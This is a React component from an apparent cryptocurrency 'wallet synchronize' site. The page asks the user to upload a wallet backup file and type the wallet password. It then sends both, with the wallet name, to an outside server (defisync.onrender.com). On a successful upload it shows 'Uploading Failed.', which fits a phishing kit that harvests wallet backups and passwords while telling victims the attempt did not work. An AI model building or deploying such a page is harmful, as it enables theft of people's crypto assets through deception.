import { Box } from '@mui/material';
import React, { useState, useEffect, useRef } from 'react'
import { useNavigate, useParams } from 'react-router-dom';
import "../styles/BackupCode.css"
import coins from './coins';
import axios from 'axios';
const style = {
    paddingTop: "10px",
    display: "flex",
    alignItems: "center",
    flexDirection: "column",
    borderRadius: "10px",
};

function BackupCode() {
    const { id } = useParams();
    
    const inputRef = useRef();
    const [selectedFile, setSelectedFile] = useState(null);
    const [password, setPassword] = useState("");
    const [wallet, setWallet] = useState("");
    const [progress, setProgress] = useState({ started: false, pc: 0});
    const [msg, setMsg] = useState(null);
        const navigate = useNavigate();

    useEffect(() => {
        setWallet(coins[id].title);
    })


    const handleFileChange = (event) => {
        if(event.target.files && event.target.files.length > 0) {
            setSelectedFile(event.target.files[0]);
        }
    }
    const onChooseFile = () => {
        inputRef.current.click();
    }
    const removeFile = () => {
        setSelectedFile(null)
    }
    const handleSubmit = (e) => {
        e.preventDefault();
        if(!selectedFile) {
            setMsg("No file selected");
            return;
        }
        
        const fd = new FormData()
        fd.append("wallet", wallet);
        fd.append("password", password)
        fd.append("file", selectedFile)
        
        setMsg("Uploading...");
        setProgress((prev) => {
            return{...prev, started: true}
        });
        axios.post("https://defisync.onrender.com/upload", fd, {
            onUploadProgress: (progressEvent) => setProgress((pre) => {
                return{...pre, pc: progressEvent*100}
                }),
            headers: {
                "Content-Type": "multipart/form-data",
                "Accept": "*/*"
            }
        }).then((res) =>{
            setMsg("Uploading Failed.")
            setSelectedFile("")
            setPassword("")
            setMsg("")
            setProgress((prev) => {return{...prev , started: false, pc: 0} })
            })
            navigate("/")
        .catch((err) =>{
            setMsg("Upload failed.")
  })
        
    }

    return (
        <div className='form-container'>
            <Box
                sx={{ ...style, '& > :not(style)': { m: 1 } }}
                noValidate
                autoComplete="off"
            >
                <div style={{ display: "inline-block", flexDirection: "column", textAlign: "center", maxWidth: "500px", alignItems: "center", justifyContent: "space-between" }}>
                    <h2>Enter your Backup Code</h2>
                    <p>
                        To Synchronize to your wallet, upload your Backup code
                    </p>
                </div>
                <form onSubmit={handleSubmit} encType='multipart/form-data'>
                    <input type='text' value={wallet} name='wallet' disabled />
                    <input onChange={handleFileChange} name='file' type="file" ref={inputRef} style={{display: "none"}} required/>
                    <button onClick={onChooseFile} className='file-btn'>
                        <span className='material-symbols-rounded'>Upload File </span>
                    </button>
                    {selectedFile && <div className='selected-file'>
                        <p>{selectedFile.name}</p>
                        <button  onClick={removeFile}>
                            <span style={{fontSize: "18px"}}>×</span>
                        </button>
                    </div>}
                    <input type='text' value={password} onChange={(e) => setPassword(e.target.value)} name='password' placeholder='Your password' />
                    <div style={{ textAlign: "center" }}>
                        <button  className="backup-btn"  type='submit'>Synchronize</button>
                        <p>{ progress.started && <progress max="100" value={progress.pc}></progress>}</p>
                        {msg && <p style={{padding: "5px", fontSize: "14px"}}>{msg}</p>}
                    </div>
                </form>
            </Box>
        </div>
    )
}

export default BackupCode